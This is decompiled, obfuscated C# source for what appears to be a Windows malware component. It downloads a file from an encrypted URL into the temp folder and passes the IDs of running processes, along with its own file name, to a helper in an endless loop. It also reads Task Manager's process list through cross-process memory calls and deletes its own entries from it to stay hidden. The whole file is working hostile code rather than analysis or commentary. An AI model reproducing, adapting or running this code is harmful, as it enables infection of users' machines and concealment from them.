using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace KXfHkplBSblOeZ;

internal sealed class GsoClIYtJBCmx
{
	private struct aNmzuawJwdY
	{
		public uint aQEoBzuLQJjNWS;

		public IntPtr hSDpnFFUWd;

		public IntPtr jHdFYFhIPFh;

		public uint rElMmyZHZsb;

		public uint bNLmctifUKA;

		public IntPtr GZZtoEmKWJAaJqfD;

		public uint vGEitOTenfmMs;

		public int dVjKppxxLrZJhib;

		public IntPtr FlKzrPDkplq;
	}

	private static volatile bool rVozgcaOYeyOi;

	public static volatile bool icVAHFARCXKU;

	[NonSerialized]
	internal static GetString getString_0;

	public static string CKguqKlsnEUN()
	{
		if (IntPtr.Size == 8)
		{
			NiISdmMYRfnXGiX.FVsxbyFxxBuvQ = QhQtNiJdLrXqD(new Uri(NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107403398))));
		}
		else
		{
			NiISdmMYRfnXGiX.FVsxbyFxxBuvQ = QhQtNiJdLrXqD(new Uri(NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107402708))));
		}
		return NiISdmMYRfnXGiX.FVsxbyFxxBuvQ;
	}

	public static string QhQtNiJdLrXqD(Uri uri_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(getString_0(107405611), getString_0(107393338)).Remove(0, 3) + getString_0(107405638);
			WebClient webClient = new WebClient();
			webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process yQnyBXTIRsa(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(string_0))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void xXsswAMuAoNvDiei(string[] string_0)
	{
		string text = CKguqKlsnEUN();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string string_ in string_0)
			{
				Process process = yQnyBXTIRsa(string_);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(text, text2 + getString_0(107392320) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(text, text2 + getString_0(107392320) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + getString_0(107402594));
					NiISdmMYRfnXGiX.dpCBMnJAbTYLKem(text, text2 + getString_0(107392320) + NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107402585)));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr cxIKgBqSWtvO);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr XHsgscjWvVGYwvME, IntPtr gbJQyzfykgR, byte[] FLuuGRsSaZYyJ, uint IfNIhWgcMYgB, out UIntPtr PJHVraEBzIwP);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr BJXqkvjjDCrx, IntPtr RNiKHpaJXh, [Out] byte[] DGRgkAUqoICV, int EyptAmfYnHuCHtQ, out UIntPtr dSPTcTmLUqe);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr QowrZAoYhz, out uint YSDgwYKzufjvqW);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	private static byte[] FxYpEzasDDceL(object object_0)
	{
		int num = Marshal.SizeOf(object_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr FsBTebsCRsjK(uint uint_0)
	{
		return OpenProcess(56, bool_0: false, uint_0);
	}

	private static void lKMsqFWdzHDN(IntPtr intptr_0)
	{
		CloseHandle(intptr_0);
	}

	private static IntPtr wtTKksEEWyj(uint uint_0, IntPtr intptr_0)
	{
		return VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
	}

	private static void TQpaAHsgHfy(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
	}

	private static IntPtr KLpnIALvoJaKAmA()
	{
		IntPtr intPtr = FindWindow(getString_0(107402560), getString_0(107402535));
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow(getString_0(107402502), getString_0(107402493));
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107402502), null);
			return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107402956), getString_0(107402935));
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107402502), null);
		return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107402956), getString_0(107402922));
	}

	private static IntPtr zobrViUPklOgCz(IntPtr intptr_0)
	{
		return SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void ikrDZnexOvz(IntPtr intptr_0, IntPtr intptr_1)
	{
		SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
	}

	private static void NkkchRYTEFqAvI(IntPtr intptr_0)
	{
		SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string VnyrRyIgoTd(IntPtr intptr_0, IntPtr intptr_1)
	{
		byte[] array = new byte[50];
		aNmzuawJwdY aNmzuawJwdY = default(aNmzuawJwdY);
		GetWindowThreadProcessId(intptr_0, out var YSDgwYKzufjvqW);
		IntPtr intPtr = FsBTebsCRsjK(YSDgwYKzufjvqW);
		IntPtr intPtr2 = wtTKksEEWyj((uint)Marshal.SizeOf(aNmzuawJwdY), intPtr);
		IntPtr intPtr3 = wtTKksEEWyj(50u, intPtr);
		aNmzuawJwdY.hSDpnFFUWd = intptr_1;
		aNmzuawJwdY.jHdFYFhIPFh = (IntPtr)0;
		aNmzuawJwdY.vGEitOTenfmMs = 50u;
		aNmzuawJwdY.GZZtoEmKWJAaJqfD = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, FxYpEzasDDceL(aNmzuawJwdY), (uint)Marshal.SizeOf(aNmzuawJwdY), out var PJHVraEBzIwP);
		SendMessage(intptr_0, 4141u, intptr_1, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out PJHVraEBzIwP);
		TQpaAHsgHfy(intPtr, intPtr2, (uint)Marshal.SizeOf(aNmzuawJwdY));
		TQpaAHsgHfy(intPtr, intPtr3, 50u);
		lKMsqFWdzHDN(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void VcOmxvINbYRYAOh(string string_0)
	{
		IntPtr intPtr = KLpnIALvoJaKAmA();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)zobrViUPklOgCz(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = VnyrRyIgoTd(intPtr, (IntPtr)i);
			if (text.Contains(string_0))
			{
				ikrDZnexOvz(intPtr, (IntPtr)i);
			}
		}
	}

	private static void SQiQuyxluHem()
	{
		IntPtr intPtr = KLpnIALvoJaKAmA();
		if (intPtr != IntPtr.Zero)
		{
			NkkchRYTEFqAvI(intPtr);
			NkkchRYTEFqAvI(intPtr);
			NkkchRYTEFqAvI(intPtr);
			NkkchRYTEFqAvI(intPtr);
			NkkchRYTEFqAvI(intPtr);
		}
	}

	public static void KokqrBVpKYNj()
	{
		Thread thread = new Thread(ZlHCDWCfIsfa);
		thread.Start();
	}

	private static void ZlHCDWCfIsfa()
	{
		while (!rVozgcaOYeyOi)
		{
			if (icVAHFARCXKU)
			{
				VcOmxvINbYRYAOh(Process.GetCurrentProcess().ProcessName + getString_0(107405638));
				Thread.Sleep(525);
			}
			else
			{
				SQiQuyxluHem();
				Thread.Sleep(1000);
			}
		}
		rVozgcaOYeyOi = false;
	}

	static GsoClIYtJBCmx()
	{
		Strings.CreateGetStringDelegate(typeof(GsoClIYtJBCmx));
		rVozgcaOYeyOi = false;
		icVAHFARCXKU = true;
	}
}
